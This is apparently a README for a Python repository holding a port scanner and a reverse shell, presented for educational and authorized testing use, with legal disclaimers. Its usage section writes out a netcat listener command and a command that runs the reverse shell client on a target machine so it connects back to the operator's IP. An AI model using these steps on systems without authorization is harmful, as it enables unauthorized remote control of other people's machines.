# python-network-tools
Welcome to this repository! Here you can find simple network tools written without any external libraries. These tools are designed to be lightweight and serve as practical examples for ethical hacking or educational purposes. 

---

## **Programs Included**

1. **Port Scanner**  
   A straightforward port scanner capable of identifying open ports on a target machine. It's implemented entirely without the use of external libraries, making it portable and easy to understand for beginners.

2. **Reverse Shell**  
   A minimalistic reverse shell implementation, also built without external dependencies. It can be used to simulate remote access in controlled environments or as part of ethical hacking exercises.

---

## **Key Features**

- No external libraries required.
- Lightweight and easy to understand.
- Useful for **educational purposes** and for learning the basics of networking and hacking.

---

## **Important Disclaimer**

These tools are developed for **educational purposes only**. Unauthorized use on systems that you do not own or do not have explicit permission to test is illegal.  
The creators of this repository do not take responsibility for any misuse of the tools. Always ensure that you are working in a legal and ethical manner when performing testing or demonstrations.

---

## **How to Use**

### Port Scanner
```bash
python port_scanner.py <target_ip>
```

### Reverse Shell
**Bind the reverse shell server on your machine:**
```bash
nc -lnvp <listener_port>
```

**Run the reverse sheel on your target machine:**
```bash
python reverse_shell_client.py <your_machine_ip> <listener_port>
```

---

## **Use Cases**

- **Educational Purposes**: Learn the basics of networking, open ports, and remote shells.
- **Ethical Hacking**: Test your own systems or systems where you have **explicit permission** to perform penetration testing.
- **Codeless Understanding**: Study the fundamental implementation of some common hacking techniques without relying on bulky dependencies.

---

## **Legal Warning**

Unauthorized scanning of ports or connecting to systems without permission is considered illegal in most jurisdictions. Use these tools responsibly, and **always ensure you have explicit permission** before testing any system. These tools are meant for educational purposes and ethical hacking within controlled environments.

---

## **Future Improvements**

- Adding more advanced scanning techniques (e.g., multi-threading).
- Improving reverse shell security features.
- Introducing more detailed logging functionality.
